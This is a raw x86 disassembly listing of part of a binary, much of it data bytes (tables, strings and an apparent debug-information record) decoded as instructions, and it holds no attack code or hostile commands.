  43357f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433585:	mov    edx,DWORD PTR [eax+0x14]
  433588:	das    
  433589:	add    al,0x45
  43358b:	add    BYTE PTR [ebp+0x0],dh
  43358e:	mov    edi,edi
  433590:	and    al,0x50
  433592:	mov    eax,DWORD PTR [eax]
  433594:	and    al,0xd1
  433596:	xor    eax,DWORD PTR [esi]
  433598:	lea    eax,[ebp+0x8]
  43359b:	xor    esi,DWORD PTR [edx+0x3]
  43359e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335b4:	cmp    bh,bh
  4335b6:	pushf  
  4335b7:	mov    edi,edi
  4335b9:	or     BYTE PTR [esi+ecx*1],cl
  4335bc:	jne    0x433581
  4335be:	call   0xc358a
  4335c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4335c7:	mov    ebx,DWORD PTR [eax]
  4335c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4335cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335d5:	pop    esi
  4335d6:	jmp    0x4335a1
  4335d8:	and    al,0x10
  4335da:	and    al,0x55
  4335dc:	or     ah,ch
  4335de:	and    al,0xe4
  4335e0:	inc    DWORD PTR [ebx+0x35e81024]
  4335e6:	(bad)  
  4335e7:	pushf  
  4335e8:	dec    DWORD PTR [ecx+0x570c2444]
  4335ee:	pop    esi
  4335ef:	inc    ecx
  4335f0:	in     eax,0x89
  4335f2:	ret    0x24
  4335f5:	mov    edi,eax
  4335f7:	and    al,0x7d
  4335f9:	mov    edx,0x768089c
  4335fe:	clc    
  4335ff:	cli    
  433600:	call   FWORD PTR [edx+0x3893274]
  433606:	dec    DWORD PTR [ecx-0x74e7db01]
  43360c:	adc    al,0xc
  43360e:	(bad)  
  43360f:	jl     0x433635
  433611:	adc    al,0x8b
  433613:	dec    ebp
  433614:	or     al,0x75
  433616:	jmp    0x4335a3
  433618:	adc    BYTE PTR [esp+eax*2],ah
  43361b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43361f:	and    al,0x9a
  433621:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433627:	dec    esp
  433628:	jne    0x433632
  43362a:	jne    0x433665
  43362c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433633:	test   BYTE PTR [ebp+0x32],bl
  433636:	and    al,0x85
  433638:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43363e:	pop    edi
  43363f:	(bad)  
  433640:	sbb    edx,DWORD PTR [eax]
  433642:	add    dl,dl
  433644:	cmp    edx,DWORD PTR [eax]
  433646:	add    BYTE PTR [esi+0x7e],al
  433649:	adc    BYTE PTR [eax],al
  43364b:	mov    eax,ds:0x1c00107e
  433650:	push   edx
  433651:	adc    BYTE PTR [eax],al
  433653:	cli    
  433654:	push   ss
  433655:	adc    BYTE PTR [eax],al
  433657:	lahf   
  433658:	adc    edx,DWORD PTR [eax]
  43365a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43365e:	add    BYTE PTR [edi+0x19001004],ah
  433664:	inc    eax
  433665:	adc    BYTE PTR [eax],al
  433667:	ds jge 0x43367a
  43366a:	add    BYTE PTR [edi],bh
  43366c:	ss inc ebx
  43366e:	add    BYTE PTR [ebx+0x36],al
  433671:	inc    ebx
  433672:	add    BYTE PTR [edi+0x36],al
  433675:	inc    ebx
  433676:	add    BYTE PTR [ebx+0x36],cl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [edi+0x36],cl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [ebx+0x36],dl
  433681:	inc    ebx
  433682:	add    BYTE PTR [edi+0x36],dl
  433685:	inc    ebx
  433686:	add    BYTE PTR [ebx+0x36],bl
  433689:	inc    ebx
  43368a:	add    BYTE PTR [edi+0x36],bl
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [ebx+0x36],ah
  433691:	inc    ebx
  433692:	add    BYTE PTR [edi+0x36],ah
  433695:	inc    ebx
  433696:	add    BYTE PTR [ecx],ah
  433698:	jno    0x4336aa
  43369a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4336a1:	adc    BYTE PTR [eax],al
  4336a3:	ja     0x433715
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	xor    BYTE PTR [edx+0x10],0x0
  4336ab:	loopne 0x43371b
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cmp    BYTE PTR [eax+0x10],dl
  4336b2:	add    BYTE PTR ds:0x9700104f,al
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [ebx+0x1004336],dh
  4336d8:	add    BYTE PTR [eax],dl
  4336da:	add    al,ah
  4336dc:	pop    ebp
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	add    ah,BYTE PTR ds:0x328d0010
  4336e5:	adc    BYTE PTR [eax],al
  4336e7:	xchg   DWORD PTR [ecx],edx
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	ja     0x4336f9
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	add    cl,BYTE PTR [eax]
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	jle    0x433769
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xlat   BYTE PTR ds:[ebx]
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    BYTE PTR [esi+0x12],bl
  433719:	adc    BYTE PTR [eax],al
  43371b:	stc    
  43371c:	push   es
  43371d:	adc    BYTE PTR [eax],al
  43371f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433720:	xor    DWORD PTR [eax],edx
  433722:	add    BYTE PTR [eax+0x7b],dl
  433725:	adc    BYTE PTR [eax],al
  433727:	stos   DWORD PTR es:[edi],eax
  433728:	push   edi
  433729:	adc    BYTE PTR [eax],al
  43372b:	inc    ebp
  43372c:	adc    edx,DWORD PTR [eax]
  43372e:	add    BYTE PTR [eax+0x38],ch
  433731:	adc    BYTE PTR [eax],al
  433733:	pop    ecx
  433734:	and    edx,DWORD PTR [eax]
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ecx+0x72],cl
  433759:	adc    BYTE PTR [eax],al
  43375b:	cmp    edi,DWORD PTR [eax+0x10]
  43375e:	add    BYTE PTR [ebx+0x23],dl
  433761:	adc    BYTE PTR [eax],al
  433763:	jno    0x4337d1
  433765:	adc    BYTE PTR [eax],al
  433767:	pop    eax
  433768:	outs   dx,BYTE PTR ds:[esi]
  433769:	adc    BYTE PTR [eax],al
  43376b:	mov    ebx,DWORD PTR [ebx+0x10]
  43376e:	add    BYTE PTR [ebx+ebx*2],ch
  433771:	adc    BYTE PTR [eax],al
  433773:	retf   0x1066
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [ebx+0x32],al
  433799:	xor    dh,BYTE PTR ds:0x5a52345f
  43379f:	push   esp
  4337a0:	xor    BYTE PTR [esi],dh
  4337a2:	add    BYTE PTR [ecx+0x36],cl
  4337a5:	push   eax
  4337a6:	pop    edi
  4337a7:	ss inc ebx
  4337a9:	ss pop edx
  4337ab:	xor    ebx,DWORD PTR [edi+0x52]
  4337ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4337b2:	pop    edi
  4337b3:	dec    esi
  4337b4:	dec    esp
  4337b5:	dec    eax
  4337b6:	xor    esi,DWORD PTR [edx]
  4337b8:	pop    edi
  4337b9:	xor    al,0x4b
  4337bb:	add    BYTE PTR [eax+0x49],cl
  4337be:	push   ebp
  4337bf:	xor    al,0x5f
  4337c1:	dec    esp
  4337c2:	inc    edx
  4337c3:	dec    ecx
  4337c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4337c7:	pop    ecx
  4337c8:	inc    edi
  4337c9:	add    BYTE PTR [eax+0x50],bl
  4337cc:	dec    eax
  4337cd:	pop    edi
  4337ce:	push   ebp
  4337cf:	push   ecx
  4337d0:	inc    edi
  4337d1:	xor    cl,BYTE PTR [edx+0x38]
  4337d4:	push   esi
  4337d5:	add    BYTE PTR [ebx+0x4a],al
  4337d8:	push   edx
  4337d9:	pop    edi
  4337da:	dec    edi
  4337db:	dec    eax
  4337dc:	dec    edi
  4337dd:	dec    edi
  4337de:	dec    edx
  4337df:	add    BYTE PTR [ecx+0x52],al
  4337e2:	cmp    DWORD PTR [edi+0x56],ebx
  4337e5:	aaa    
  4337e6:	dec    esp
  4337e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ea:	push   edx
  4337eb:	inc    esp
  4337ec:	add    BYTE PTR [ecx+0x37],bl
  4337ef:	inc    esp
  4337f0:	pop    edi
  4337f1:	dec    ecx
  4337f2:	xor    esi,DWORD PTR [edi]
  4337f4:	xor    DWORD PTR [edi+0x49],ebx
  4337f7:	push   esp
  4337f8:	xor    eax,DWORD PTR [eax]
  4337fa:	push   edx
  4337fb:	xor    BYTE PTR [eax+0x5f],bl
  4337fe:	dec    eax
  4337ff:	push   edi
  433800:	inc    esi
  433801:	xor    DWORD PTR [edi+0x5f],edx
  433804:	cmp    BYTE PTR [ebx+0x37],dl
  433807:	add    BYTE PTR [esi+0x42],dl
  43380a:	dec    ecx
  43380b:	xor    ebx,DWORD PTR [edi+0x45]
  43380e:	xor    BYTE PTR [ebp+0x5f],cl
  433811:	xor    al,0x34
  433813:	xor    BYTE PTR [edx+0x5f],cl
  433816:	inc    edi
  433817:	add    BYTE PTR [edx+0x57],dl
  43381a:	xor    ebx,DWORD PTR [edi+0x31]
  43381d:	dec    edx
  43381e:	push   edi
  43381f:	xor    eax,0x4d435f
  433824:	dec    ecx
  433825:	xor    eax,0x36365f39
  43382a:	dec    eax
  43382b:	xor    BYTE PTR [eax],al
  43382d:	dec    edi
  43382e:	inc    ebx
  43382f:	push   edi
  433830:	pop    edi
  433831:	inc    edi
  433832:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433837:	add    BYTE PTR [edx+0x58],al
  43383a:	inc    edi
  43383b:	ss pop edi
  43383d:	push   esi
  43383e:	inc    ebx
  43383f:	dec    esi
  433840:	inc    esp
  433841:	add    BYTE PTR [edi+0x4d],cl
  433844:	inc    edi
  433845:	xor    ebx,DWORD PTR [edi+0x34]
  433848:	dec    esi
  433849:	pop    edx
  43384a:	cmp    BYTE PTR [edi+0x58],bl
  43384d:	cmp    BYTE PTR [eax],al
  43384f:	push   edx
  433850:	pop    eax
  433851:	push   ecx
  433852:	pop    edi
  433853:	dec    esp
  433854:	push   edx
  433855:	dec    ecx
  433856:	dec    edi
  433857:	inc    esp
  433858:	pop    edi
  433859:	dec    edi
  43385a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43385e:	push   eax
  43385f:	inc    ebp
  433860:	pop    edi
  433861:	xor    eax,0x565f3945
  433866:	add    BYTE PTR [edi+0x4e],al
  433869:	push   esi
  43386a:	pop    edi
  43386b:	inc    edi
  43386c:	push   esp
  43386d:	dec    eax
  43386e:	xor    dh,BYTE PTR [ecx]
  433870:	pop    edi
  433871:	dec    edi
  433872:	xor    eax,DWORD PTR ss:[eax]
  433875:	inc    esp
  433876:	inc    ebp
  433877:	dec    ecx
  433878:	pop    edi
  433879:	push   edx
  43387a:	dec    eax
  43387b:	xor    al,0x48
  43387d:	dec    ecx
  43387e:	ss pop edi
  433880:	aaa    
  433881:	aaa    
  433882:	dec    ecx
  433883:	dec    ebp
  433884:	add    BYTE PTR [eax+0x54],cl
  433887:	ss pop edi
  433889:	inc    esi
  43388a:	inc    edx
  43388b:	xor    dh,BYTE PTR [eax+eax*1]
  43388e:	dec    esi
  43388f:	ss dec edx
  433891:	pop    edi
  433892:	dec    ecx
  433893:	dec    esp
  433894:	inc    edi
  433895:	inc    esp
  433896:	dec    eax
  433897:	xor    BYTE PTR [eax],bh
  433899:	xor    eax,0x4c344f00
  43389e:	xor    esi,DWORD PTR [edi]
  4338a0:	xor    BYTE PTR [edi+0x44],bl
  4338a3:	inc    edi
  4338a4:	dec    ebx
  4338a5:	xor    al,BYTE PTR [ecx+0x43]
  4338a8:	add    BYTE PTR [edi+0x32],cl
  4338ab:	xor    ebx,DWORD PTR [edi+0x57]
  4338ae:	xor    cl,BYTE PTR [edi+0x5f]
  4338b1:	pop    edx
  4338b2:	add    BYTE PTR [eax+0x4c],bl
  4338b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4338b8:	inc    ecx
  4338b9:	dec    edx
  4338ba:	inc    esi
  4338bb:	xor    DWORD PTR [edi+ebx*2],esi
  4338be:	pop    eax
  4338bf:	inc    edi
  4338c0:	inc    edx
  4338c1:	add    BYTE PTR [eax+0x33],dl
  4338c4:	dec    esi
  4338c5:	pop    edi
  4338c6:	dec    eax
  4338c7:	xor    eax,0x485f53
  4338cc:	dec    ebp
  4338cd:	xor    BYTE PTR [edx+0x5f],al
  4338d0:	dec    edx
  4338d1:	pop    eax
  4338d2:	push   esp
  4338d3:	dec    ecx
  4338d4:	dec    esp
  4338d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4338d9:	xor    esi,DWORD PTR [eax]
  4338db:	pop    edi
  4338dc:	inc    ecx
  4338dd:	pop    edx
  4338de:	push   ecx
  4338df:	pop    edx
  4338e0:	cmp    DWORD PTR [esi],esi
  4338e2:	pop    edi
  4338e3:	dec    eax
  4338e4:	dec    esp
  4338e5:	pop    edx
  4338e6:	add    BYTE PTR [ecx+0x57],dl
  4338e9:	pop    ecx
  4338ea:	pop    edi
  4338eb:	push   esi
  4338ec:	xor    al,0x44
  4338ee:	xor    DWORD PTR [eax],edi
  4338f0:	xor    bl,BYTE PTR [edi+0x39]
  4338f3:	push   esp
  4338f4:	push   esp
  4338f5:	add    BYTE PTR [esi+0x0],dl
  4338f8:	dec    edi
  4338f9:	add    BYTE PTR [edi+0x0],al
  4338fc:	add    BYTE PTR ss:[edi+0x0],bl
  433900:	dec    edi
  433901:	add    BYTE PTR [edx+0x0],bl
  433904:	inc    ebp
  433905:	add    BYTE PTR [eax],dh
  433907:	add    BYTE PTR [ebp+0x0],al
  43390a:	xor    BYTE PTR [eax],al
  43390c:	pop    edi
  43390d:	add    BYTE PTR [eax],dh
  43390f:	add    BYTE PTR ds:0x4f000000,dh
  433915:	add    BYTE PTR ds:0x5f005700,dh
  43391b:	add    BYTE PTR [edi],dh
  43391d:	add    BYTE PTR [ebx+0x0],dl
  433920:	push   ebp
  433921:	add    BYTE PTR [edi+0x0],al
  433924:	xor    al,0x0
  433926:	pop    edi
  433927:	add    BYTE PTR [ecx+0x0],dl
  43392a:	inc    esp
  43392b:	add    BYTE PTR [eax],al
  43392d:	add    BYTE PTR [edx+0x0],dl
  433930:	push   esp
  433931:	add    BYTE PTR ds:0x52005f00,dh
  433937:	add    BYTE PTR [edi+0x0],dl
  43393a:	xor    al,BYTE PTR [eax]
  43393c:	xor    al,BYTE PTR [eax]
  43393e:	xor    BYTE PTR [eax],al
  433940:	xor    BYTE PTR [eax],al
  433942:	pop    edi
  433943:	add    BYTE PTR [esi],dh
  433945:	add    BYTE PTR [eax],al
  433947:	add    BYTE PTR [eax+0x0],cl
  43394a:	inc    ebp
  43394b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43394f:	add    BYTE PTR [edi+0x0],bl
  433952:	dec    edx
  433953:	add    BYTE PTR [edx],dh
  433955:	add    BYTE PTR [edi],dh
  433957:	add    BYTE PTR [ebp+0x0],dl
  43395a:	add    BYTE PTR ss:[eax],dh
  43395d:	add    BYTE PTR [eax],al
  43395f:	add    BYTE PTR [esi+0x0],dl
  433962:	cmp    BYTE PTR [eax],al
  433964:	dec    edi
  433965:	add    BYTE PTR [ecx],bh
  433967:	add    BYTE PTR [edi+0x0],bl
  43396a:	pop    eax
  43396b:	add    BYTE PTR [edx+0x0],bl
  43396e:	dec    esp
  43396f:	add    BYTE PTR [ebx+0x0],cl
  433972:	add    BYTE PTR [eax],al
  433974:	dec    ecx
  433975:	add    BYTE PTR [ebp+0x0],dl
  433978:	dec    edi
  433979:	add    BYTE PTR [eax],bh
  43397b:	add    BYTE PTR [edi+0x0],bl
  43397e:	inc    esp
  43397f:	add    BYTE PTR [eax],bh
  433981:	add    BYTE PTR [ecx+0x0],cl
  433984:	dec    eax
  433985:	add    BYTE PTR [edi+0x0],cl
  433988:	pop    edi
  433989:	add    BYTE PTR [ebp+0x0],al
  43398c:	pop    eax
  43398d:	add    BYTE PTR [eax],al
  43398f:	add    BYTE PTR [edx+0x0],dl
  433992:	dec    esp
  433993:	add    BYTE PTR [esi],dh
  433995:	add    BYTE PTR [edi+0x0],bl
  433998:	aaa    
  433999:	add    BYTE PTR [eax+0x0],bl
  43399c:	xor    eax,DWORD PTR [eax]
  43399e:	inc    edi
  43399f:	add    BYTE PTR [ecx+0x0],dl
  4339a2:	pop    edi
  4339a3:	add    BYTE PTR [edx+0x0],cl
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	inc    edi
  4339a9:	add    BYTE PTR [edi+0x0],cl
  4339ac:	push   ebx
  4339ad:	add    BYTE PTR [eax+eax*1],dh
  4339b0:	pop    edi
  4339b1:	add    BYTE PTR [ecx+0x0],cl
  4339b4:	xor    DWORD PTR [eax],eax
  4339b6:	push   esi
  4339b7:	add    BYTE PTR [ebx],dh
  4339b9:	add    BYTE PTR [edi+0x0],bl
  4339bc:	dec    ecx
  4339bd:	add    BYTE PTR [edx+0x0],bl
  4339c0:	add    BYTE PTR [eax],al
  4339c2:	inc    ebx
  4339c3:	add    BYTE PTR [ecx+0x0],bl
  4339c6:	inc    ecx
  4339c7:	add    BYTE PTR [eax],dh
  4339c9:	add    BYTE PTR [ecx],bh
  4339cb:	add    BYTE PTR [edi+0x0],bl
  4339ce:	cmp    DWORD PTR [eax],eax
  4339d0:	push   eax
  4339d1:	add    BYTE PTR [eax+eax*1],dh
  4339d4:	pop    edx
  4339d5:	add    BYTE PTR [eax],al
  4339d7:	add    BYTE PTR [edx+0x0],al
  4339da:	inc    esi
  4339db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4339df:	add    BYTE PTR [ebp+0x0],dl
  4339e2:	push   ebp
  4339e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4339e7:	add    BYTE PTR [eax],al
  4339e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4339ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4339f1:	add    BYTE PTR [edi+0x0],bl
  4339f4:	xor    eax,DWORD PTR [eax]
  4339f6:	cmp    DWORD PTR [eax],eax
  4339f8:	dec    eax
  4339f9:	add    BYTE PTR [edi+0x0],bl
  4339fc:	dec    ebp
  4339fd:	add    BYTE PTR [ecx+0x0],bl
  433a00:	cmp    DWORD PTR [eax],eax
  433a02:	inc    ecx
  433a03:	add    BYTE PTR [esi+0x0],cl
  433a06:	add    BYTE PTR [eax],al
  433a08:	inc    ebx
  433a09:	add    BYTE PTR [eax+0x0],dl
  433a0c:	dec    esi
  433a0d:	add    BYTE PTR [eax+eax*1],dh
  433a10:	pop    edi
  433a11:	add    BYTE PTR [eax+eax*1+0x54],cl
  433a15:	add    BYTE PTR [ebx+0x0],cl
  433a18:	xor    DWORD PTR [eax],eax
  433a1a:	add    BYTE PTR [eax],al
  433a1c:	inc    ecx
  433a1d:	add    BYTE PTR [edi],dh
  433a1f:	add    BYTE PTR [edx+0x0],cl
  433a22:	pop    edi
  433a23:	add    BYTE PTR [ebx+0x0],al
  433a26:	cmp    BYTE PTR [eax],al
  433a28:	push   edi
  433a29:	add    BYTE PTR [eax+0x0],dl
  433a2c:	pop    edi
  433a2d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433a31:	add    BYTE PTR [edx],dh
  433a33:	add    BYTE PTR [eax],al
  433a35:	add    BYTE PTR [edx+0x0],al
  433a38:	add    BYTE PTR [eax],al
  433a3a:	push   edx
  433a3b:	push   ebx
  433a3c:	inc    esp
  433a3d:	push   ebx
  433a3e:	jmp    0x6e31:0x272f706
  433a45:	dec    ebp
  433a46:	mov    bh,BYTE PTR [eax+0x78]
  433a49:	cmp    ebx,eax
  433a4b:	imul   edx,DWORD PTR [esi+0x1353],0x5c3a4f00
  433a55:	jno    0x433aab
  433a57:	inc    esp
  433a58:	jp     0x433aa8
  433a5a:	jb     0x433ab6
  433a5c:	addr16 jne 0x433ac2
  433a5f:	jns    0x433ad1
  433a61:	jbe    0x433abf
  433a63:	push   0x62
  433a65:	push   edi
  433a66:	jns    0x433ae0
  433a68:	inc    ebp
  433a69:	ins    DWORD PTR es:[edi],dx
  433a6a:	jbe    0x433ad3
  433a6c:	popa   
  433a6d:	pop    esp
  433a6e:	je     0x433ada
  433a70:	pop    edx
  433a71:	data16 jne 0x433ae6
  433a74:	ja     0x433ade
  433a76:	push   edx
  433a77:	bound  eax,QWORD PTR [ebp+0x72]
  433a7a:	pop    esp
  433a7b:	dec    edx
  433a7c:	jae    0x433ac2
  433a7e:	ins    DWORD PTR es:[edi],dx
  433a7f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433a83:	jo     0x433ae9
  433a85:	bound  eax,QWORD PTR [eax]
	...
